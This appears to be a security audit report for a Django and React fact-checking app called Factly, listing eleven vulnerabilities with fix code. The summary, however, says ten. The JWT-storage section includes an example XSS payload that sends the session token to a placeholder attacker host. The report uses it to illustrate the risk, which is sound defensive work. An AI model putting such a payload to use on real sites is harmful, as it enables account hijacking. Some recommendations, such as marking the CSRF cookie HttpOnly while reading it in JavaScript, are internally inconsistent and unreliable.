# Security Vulnerability Audit Report
**Date:** March 4, 2026  
**Project:** Factly  
**Scope:** Backend (Django) & Frontend (React)

---

## Executive Summary

This audit identified **10 security vulnerabilities** ranging from Low to High severity. The most critical issue is the exposed password reset link endpoint in the development view. Several vulnerabilities involve weak authentication token storage, insecure API key handling, and insufficient input validation.

---

## Critical & High Severity Issues

### 1. 🔴 HIGH: Development Endpoint Exposed - Password Reset Link Disclosure
**Location:** [backend/verification/auth_views.py](backend/verification/auth_views.py#L352-L410)  
**Severity:** HIGH  
**Status:** VULNERABLE

**Issue:**
The `GetResetLinkView` endpoint allows ANY unauthenticated user to obtain password reset links if `DEBUG=True`. While it checks for DEBUG mode, this endpoint should NOT be in production code.

```python
# Lines 352-410 in auth_views.py
class GetResetLinkView(APIView):
    """Development-only endpoint to retrieve reset link for testing."""
    permission_classes = [AllowAny]
    
    def post(self, request):
        # Security: Only allow in development mode
        if not os.getenv('DEBUG', 'False').lower() in ('1', 'true', 'yes'):
            return Response({...}, status=status.HTTP_403_FORBIDDEN)
        
        # But it's still in the URL patterns and accessible!
```

**Attack Scenario:**
- If `DEBUG=True` is accidentally left in production, an attacker can call `/api/auth/get-reset-link/` with any email
- This bypasses email verification and grants password reset capability
- The endpoint returns the actual reset token in the response

**Recommendation:**
```python
# REMOVE this endpoint entirely from production
# If needed for testing, use a separate test-only app or remove it completely

# In urls.py, DELETE this line:
# path('auth/get-reset-link/', auth_views.GetResetLinkView.as_view(), name='get_reset_link'),
```

---

### 2. 🔴 HIGH: Insecure JWT Token Storage - XSS Vulnerability
**Location:** [frontend/src/context/AuthContext.js](frontend/src/context/AuthContext.js#L22-L27)  
**Severity:** HIGH  
**Status:** VULNERABLE

**Issue:**
JWT tokens are stored in `sessionStorage` which is vulnerable to Cross-Site Scripting (XSS) attacks. Any XSS vulnerability can expose the token.

```javascript
// Lines 22-27 in AuthContext.js
sessionStorage.setItem('authToken', data.access);
sessionStorage.setItem('user', JSON.stringify(data.user));
```

**Risk:**
- XSS payload: `<script>fetch('attacker.com?token=' + sessionStorage.getItem('authToken'))</script>`
- Attacker gains full user session access
- JWT tokens typically have long expiration periods

**Recommendation:**
Use **HttpOnly, Secure cookies** instead (requires backend changes):

```javascript
// Frontend should NOT handle token storage
// Backend should send tokens via Set-Cookie header:
// Set-Cookie: authToken=eyJ...; HttpOnly; Secure; SameSite=Strict; Path=/api
// Set-Cookie: refreshToken=eyJ...; HttpOnly; Secure; SameSite=Strict; Path=/api

// Frontend can then use credentials: 'include' in fetch requests
const response = await fetch(API_ENDPOINTS.LOGIN, {
  method: 'POST',
  credentials: 'include',  // Auto-send cookies
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ email, password }),
});
```

**Backend Changes Required:**
```python
# In settings.py
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_SAMESITE = 'Strict'

CSRF_COOKIE_HTTPONLY = True
CSRF_COOKIE_SECURE = True
CSRF_COOKIE_SAMESITE = 'Strict'

# In auth_views.py - send tokens via cookies, not JSON response
from django.http import JsonResponse
response = JsonResponse({'success': True, 'user': {...}})
response.set_cookie('authToken', str(refresh.access_token), 
                   httponly=True, secure=True, samesite='Strict')
response.set_cookie('refreshToken', str(refresh), 
                   httponly=True, secure=True, samesite='Strict')
```

---

### 3. 🔴 HIGH: API Key Exposed in Query Parameters
**Location:** [backend/services/fact_checking_service/google_fact_check.py](backend/services/fact_checking_service/google_fact_check.py#L73-L84)  
**Severity:** HIGH  
**Status:** VULNERABLE

**Issue:**
Google Fact Check API key is sent as a URL query parameter, which means:
- **Server logs** will contain the API key
- **Proxy/CDN logs** will contain the API key
- **Browser history** if accessed from frontend
- **HTTP Referrer headers** expose the key to downstream sites

```python
# Lines 73-84 in google_fact_check.py
def _search_claims_api(self, query: str, language: str, max_results: int):
    params = {
        'key': self.api_key,  # ⚠️ INSECURE: Key in URL query parameter
        'query': query,
        'languageCode': language,
        'pageSize': max_results
    }
    response = requests.get(self.BASE_URL, params=params, timeout=30)
```

**Impact:**
- Quota exhaustion attacks using stolen API key
- Billing fraud (if using paid API)
- Account takeover of Google account

**Recommendation:**
Contact Google about using API Authorization headers instead. If not possible, store the key server-side and use backend proxying:

```python
# Better approach - but limited by Google API design
# Until Google supports Authorization headers, keep key in environment only
# and never log requests with the key

# In logging configuration (settings.py):
LOGGING = {
    'handlers': {
        'file': {
            'filters': ['redact_api_keys']  # Add custom filter
        }
    }
}

# Create custom logging filter:
# verification/logging_filters.py
import re
import logging

class RedactApiKeysFilter(logging.Filter):
    def filter(self, record):
        record.msg = re.sub(r'key=[^&\s"]+', 'key=***REDACTED***', str(record.msg))
        return True
```

---

## Medium Severity Issues

### 4. 🟠 MEDIUM: Weak Password Policy
**Location:** [backend/verification/auth_views.py](backend/verification/auth_views.py#L86-L90)  
**Severity:** MEDIUM  
**Status:** VULNERABLE

**Issue:**
Passwords are only validated to be 6+ characters, which is weak by modern standards.

```python
# Lines 86-90 in auth_views.py
if len(password) < 6:
    return Response(
        {'error': 'Password must be at least 6 characters'},
        status=status.HTTP_400_BAD_REQUEST
    )
```

**Risk:**
- Brute force attacks
- Dictionary attacks
- Compromised credentials from other sites

**Recommendation:**
```python
import re
from django.contrib.auth.password_validation import validate_password
from django.core.exceptions import ValidationError

def validate_strong_password(password):
    """Enforce strong password policy."""
    errors = []
    
    if len(password) < 12:
        errors.append('Password must be at least 12 characters')
    if not re.search(r'[A-Z]', password):
        errors.append('Password must contain uppercase letters')
    if not re.search(r'[a-z]', password):
        errors.append('Password must contain lowercase letters')
    if not re.search(r'[0-9]', password):
        errors.append('Password must contain numbers')
    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        errors.append('Password must contain special characters')
    
    # Also use Django's validators
    try:
        validate_password(password)
    except ValidationError as e:
        errors.extend(e.messages)
    
    return errors

# In SignupView:
if len(password) < 12:
    return Response(
        {'error': 'Password must be at least 12 characters with uppercase, lowercase, numbers, and symbols'},
        status=status.HTTP_400_BAD_REQUEST
    )

errors = validate_strong_password(password)
if errors:
    return Response(
        {'error': ' '.join(errors)},
        status=status.HTTP_400_BAD_REQUEST
    )
```

Update frontend password strength indicator:
```javascript
// In ResetPasswordPage.js
const calculatePasswordStrength = useCallback((password) => {
  if (!password) return 'empty';
  if (password.length < 12) return 'weak';
  const hasUpper = /[A-Z]/.test(password);
  const hasLower = /[a-z]/.test(password);
  const hasNumber = /[0-9]/.test(password);
  const hasSymbol = /[!@#$%^&*(),.?":{}|<>]/.test(password);
  
  const score = [hasUpper, hasLower, hasNumber, hasSymbol].filter(Boolean).length;
  return score >= 4 ? 'strong' : score >= 3 ? 'medium' : 'weak';
}, []);
```

---

### 5. 🟠 MEDIUM: Insecure In-Memory Rate Limiting - Non-Scalable
**Location:** [backend/verification/views.py](backend/verification/views.py#L20-L51)  
**Severity:** MEDIUM  
**Status:** VULNERABLE

**Issue:**
Rate limiting is stored in an instance variable, which doesn't work across multiple server instances.

```python
# Lines 20-51 in views.py
class EnhancedVerificationView(APIView):
    # Simple in-memory rate limiting
    _rate_limit_storage = {}  # ⚠️ Per-instance storage, not shared
    
    def _check_rate_limit(self, request):
        # Only tracks requests for THIS server instance
```

**Risk:**
- Multiple servers have separate rate limits
- Rate limit can be bypassed by round-robin across servers
- Attacker can DDoS 10 requests × N servers

**Recommendation:**
Use Redis for distributed rate limiting:

```python
# Install: pip install django-ratelimit
# OR: pip install redis

# In settings.py
CACHES = {
    'default': {
        'BACKEND': 'django_redis.cache.RedisCache',
        'LOCATION': os.getenv('REDIS_URL', 'redis://127.0.0.1:6379/1'),
    }
}

# In views.py
from django_ratelimit.decorators import ratelimit
from rest_framework.decorators import api_view

RATE_LIMIT_REQUESTS = 10
RATE_LIMIT_WINDOW = 3600

class EnhancedVerificationView(APIView):
    def post(self, request):
        cache = caches['default']
        ip = self._get_client_ip(request)
        cache_key = f'rate_limit:{ip}'
        
        request_count = cache.get(cache_key, 0)
        if request_count >= RATE_LIMIT_REQUESTS:
            return Response(
                {"error": "Rate limit exceeded. Please try again later.", 
                 "retry_after": RATE_LIMIT_WINDOW},
                status=status.HTTP_429_TOO_MANY_REQUESTS
            )
        
        cache.set(cache_key, request_count + 1, RATE_LIMIT_WINDOW)
        # ... rest of view
```

---

### 6. 🟠 MEDIUM: ALLOWED_HOSTS Includes '0.0.0.0'
**Location:** [backend/factly_backend/settings.py](backend/factly_backend/settings.py#L34-L35)  
**Severity:** MEDIUM  
**Status:** VULNERABLE

**Issue:**
Default ALLOWED_HOSTS allows '0.0.0.0' which can lead to Host header injection attacks.

```python
# Lines 34-35
ALLOWED_HOSTS = [...] if _allowed else ['localhost', '127.0.0.1', 'testserver', '0.0.0.0']
```

**Risk:**
- Host header injection attacks
- Cache poisoning
- Email link injection (password reset link could point to attacker's server)

**Recommendation:**
```python
# settings.py
_allowed = os.getenv('ALLOWED_HOSTS', '')
ALLOWED_HOSTS = [h.strip() for h in _allowed.split(',') if h.strip()] if _allowed else []

# For development, use explicit hosts:
# ALLOWED_HOSTS = ['localhost', '127.0.0.1', 'testserver']

# In production, set environment variable:
# export ALLOWED_HOSTS="example.com,www.example.com"
```

---

### 7. 🟠 MEDIUM: CSP Allows Unsafe-Inline Styles
**Location:** [backend/factly_backend/settings.py](backend/factly_backend/settings.py#L205-215)  
**Severity:** MEDIUM  
**Status:** VULNERABLE

**Issue:**
Content Security Policy allows `'unsafe-inline'` for styles, weakening XSS protection.

```python
# Lines 205-215
SECURE_CONTENT_SECURITY_POLICY = {
    "style-src": ("'self'", "'unsafe-inline'"),  # ⚠️ Allows inline styles
    ...
}
```

**Risk:**
- Inline styles can be injected via XSS to execute JavaScript
- Reduces effectiveness of CSP protection

**Recommendation:**
```python
# Use external stylesheets only
SECURE_CONTENT_SECURITY_POLICY = {
    "default-src": ("'self'",),
    "script-src": ("'self'",),
    "style-src": ("'self'", "https://fonts.googleapis.com",),  # External stylesheets
    "img-src": ("'self'", "data:", "https:"),
    "font-src": ("'self'", "https://fonts.gstatic.com"),
    "connect-src": ("'self'", "http://localhost:8000", "https://api.example.com"),
    "frame-ancestors": ("'none'",),
    "base-uri": ("'self'",),
    "form-action": ("'self'",),
}
```

---

### 8. 🟠 MEDIUM: Password Reset Token in Debug Logs
**Location:** [backend/verification/auth_views.py](backend/verification/auth_views.py#L207-210)  
**Severity:** MEDIUM  
**Status:** VULNERABLE

**Issue:**
Reset tokens are logged at DEBUG level, exposing sensitive information.

```python
# Lines 207-210 in auth_views.py
logger.debug(f"Reset link: {reset_link}")  # ⚠️ Exposes token in logs
```

**Risk:**
- Server logs contain reset tokens
- Anyone with log access can reset user passwords
- Tokens may be retained in log aggregation systems

**Recommendation:**
```python
# REMOVE:
logger.debug(f"Reset link: {reset_link}")

# Only log in development console if needed:
if os.getenv('DEBUG'):
    print(f"[DEV ONLY] Reset link: {reset_link}")  # Console only, not logs
```

---

### 9. 🟠 MEDIUM: Missing CSRF Token in Frontend Requests
**Location:** [frontend/src/utils/apiClient.js](frontend/src/utils/apiClient.js) & [frontend/src/context/AuthContext.js](frontend/src/context/AuthContext.js)  
**Severity:** MEDIUM  
**Status:** POTENTIALLY VULNERABLE

**Issue:**
Frontend doesn't send CSRF tokens in POST requests. While the backend has CSRF middleware, it might not be enforced for all state-changing operations.

```javascript
// Lines in apiClient.js
const response = await fetch(url, {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    // Missing: 'X-CSRFToken': token
  },
  body: JSON.stringify(data),
});
```

**Risk:**
- CSRF attacks if cookies are used for authentication
- Currently mitigated by JSON API + SameSite cookies, but not defense-in-depth

**Recommendation:**
```javascript
// Add CSRF token extraction and inclusion:
// frontend/src/utils/csrf.js
export const getCsrfToken = () => {
  const name = 'csrftoken';
  let cookieValue = null;
  if (document.cookie && document.cookie !== '') {
    const cookies = document.cookie.split(';');
    for (let i = 0; i < cookies.length; i++) {
      const cookie = cookies[i].trim();
      if (cookie.substring(0, name.length + 1) === (name + '=')) {
        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
        break;
      }
    }
  }
  return cookieValue;
};

// In apiClient.js:
import { getCsrfToken } from './csrf';

export const apiPost = async (url, data, options = {}) => {
  const csrfToken = getCsrfToken();
  try {
    const response = await fetch(url, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        ...(csrfToken && { 'X-CSRFToken': csrfToken }),
        ...options.headers,
      },
      body: JSON.stringify(data),
    });
    // ... rest
};
```

---

## Low Severity Issues

### 10. 🟡 LOW: Missing Security Headers
**Location:** [backend/factly_backend/settings.py](backend/factly_backend/settings.py)  
**Severity:** LOW  
**Status:** INCOMPLETE

**Issue:**
Several important security headers are missing:

1. **X-Content-Type-Options**: Missing MIME type sniffing protection
2. **Referrer-Policy**: Missing to prevent referrer leakage
3. **Permissions-Policy**: Missing to control browser features
4. **HSTS**: Not explicitly set

**Recommendation:**
```python
# settings.py - Add these settings:

# Prevent MIME type sniffing
SECURE_CONTENT_TYPE_NOSNIFF = True

# Control referrer information
SECURE_REFERRER_POLICY = 'strict-origin-when-cross-origin'

# Disable unneeded browser features
SECURE_PERMISSIONS_POLICY = {
    "geolocation": (),
    "microphone": (),
    "camera": (),
    "payment": (),
}

# Enable HSTS (after testing with preload)
SECURE_HSTS_SECONDS = 31536000  # 1 year
SECURE_HSTS_INCLUDE_SUBDOMAINS = True
SECURE_HSTS_PRELOAD = True  # After verified with hstspreload.org

# Also add to server response headers manually if needed:
# In middleware or web server configuration:
# Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
# X-Content-Type-Options: nosniff
# X-Frame-Options: DENY
# X-XSS-Protection: 1; mode=block
# Referrer-Policy: strict-origin-when-cross-origin
```

---

### 11. 🟡 LOW: No JWT Token Expiration Handling
**Location:** [frontend/src/context/AuthContext.js](frontend/src/context/AuthContext.js)  
**Severity:** LOW  
**Status:** INCOMPLETE

**Issue:**
Frontend doesn't handle JWT token expiration. Users might continue using an expired token.

**Recommendation:**
```javascript
// Add token expiration check in AuthContext.js:
import jwtDecode from 'jwt-decode';  // npm install jwt-decode

const isTokenExpired = (token) => {
  try {
    const decoded = jwtDecode(token);
    const now = Date.now() / 1000;  // Current time in seconds
    return decoded.exp < now;
  } catch {
    return true;
  }
};

// In useEffect or before making requests:
useEffect(() => {
  const token = sessionStorage.getItem('authToken');
  if (token && isTokenExpired(token)) {
    logout();  // Clear expired token
    // Optionally: try to refresh with refresh token
  }
}, []);

// Add auto-refresh before expiration:
const setupTokenRefresh = (refreshToken) => {
  const decoded = jwtDecode(refreshToken);
  const expiresIn = (decoded.exp * 1000) - Date.now();
  const refreshBefore = 5 * 60 * 1000;  // Refresh 5 minutes before expiry
  
  if (expiresIn > refreshBefore) {
    setTimeout(() => {
      // Call refresh endpoint
      refreshAccessToken(refreshToken);
    }, expiresIn - refreshBefore);
  }
};
```

---

## Summary Table

| # | Issue | Severity | Location | Fix Time |
|---|-------|----------|----------|----------|
| 1 | Development endpoint exposed | HIGH | auth_views.py | 15 min |
| 2 | JWT in sessionStorage (XSS) | HIGH | AuthContext.js | 4 hours |
| 3 | API key in URL | HIGH | google_fact_check.py | 2 hours |
| 4 | Weak password policy | MEDIUM | auth_views.py | 1 hour |
| 5 | In-memory rate limiting | MEDIUM | views.py | 2 hours |
| 6 | ALLOWED_HOSTS '0.0.0.0' | MEDIUM | settings.py | 15 min |
| 7 | CSP unsafe-inline styles | MEDIUM | settings.py | 30 min |
| 8 | Reset tokens in logs | MEDIUM | auth_views.py | 15 min |
| 9 | Missing CSRF tokens | MEDIUM | apiClient.js | 1 hour |
| 10 | Missing security headers | LOW | settings.py | 1 hour |
| 11 | No token expiration | LOW | AuthContext.js | 1 hour |

---

## Priority Action Plan

### IMMEDIATE (Do Today)
1. Remove `GetResetLinkView` endpoint from production URL patterns
2. Remove password reset token logging
3. Fix ALLOWED_HOSTS default to exclude '0.0.0.0'
4. Add missing security headers

### SHORT-TERM (This Week)
1. Implement strong password policy
2. Add CSRF token support to frontend
3. Switch to Redis-based rate limiting
4. Fix CSP to remove unsafe-inline

### MEDIUM-TERM (Next Sprint)
1. Migrate JWT tokens to HttpOnly cookies
2. Implement token expiration handling
3. Add security logging and monitoring

### LONG-TERM (Next Release)
1. Add device fingerprinting
2. Implement login anomaly detection
3. Add audit logging for sensitive operations

---

## Testing Checklist

- [ ] Run `python manage.py check --deploy` for Django security checks
- [ ] Use OWASP ZAP or Burp Suite to scan frontend
- [ ] Test password reset flow with expired tokens
- [ ] Verify HTTPS redirection works
- [ ] Test rate limiting across distributed servers
- [ ] Verify CSP is not blocking legitimate content
- [ ] Check browser developer tools for console errors
- [ ] Verify tokens cleared on logout
- [ ] Test with browser cookie restrictions enabled

---

## References

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Django Security Documentation](https://docs.djangoproject.com/en/6.0/topics/security/)
- [React Security Best Practices](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)
- [MDN Web Security](https://developer.mozilla.org/en-US/docs/Web/Security)

